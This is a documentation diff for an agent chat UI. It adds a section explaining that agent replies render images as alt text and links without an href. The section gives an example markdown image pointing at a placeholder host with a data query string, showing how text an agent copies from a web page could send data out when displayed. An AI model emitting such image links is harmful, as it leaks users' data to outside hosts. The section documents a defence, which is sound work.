@@ -208,6 +208,22 @@ which is how any client app customizes the generic chat UI. The turn runs throug
 Elise's `respond`, so the **crisis guardrail applies in the browser exactly as in
 the CLI**.
 
+### Images and links in the agent's replies
+
+The chat page renders the agent's replies as untrusted text (#1119). An image in a reply shows
+as its alt text and is not fetched, and a link shows as its text, with no `href`. A reply can
+repeat text the agent read somewhere else, such as a web page or a document, and a browser
+fetches an image as soon as it is shown, without a click. A reply holding
+`![x](https://elsewhere.example/?d=...)` would otherwise send that request from the reader's
+machine. In a desktop webview, following a link replaces the app's own page with the linked one.
+
+The user's own messages still render images and links. An app whose agent's replies are trusted
+passes `:trusted-replies t` to `praxeon/web:start`, `serve-forever` or `make-app`. An app that
+renders the bubbles itself passes the same options to `hyperion/markdown:render` through
+`praxeon/chat-ui:assistant-bubble` and `user-bubble`: `:images` (`t` or `nil`) and `:links`
+(`t` or `:text`). `assistant-bubble` defaults to `:images nil :links :text`, and `user-bubble`
+to `:images t :links t`.
+
 ### Talk to Elise in your language
 
 Elise ships an i18n dictionary (`examples/elise/resources/i18n/{en,es,ru}.json`) —
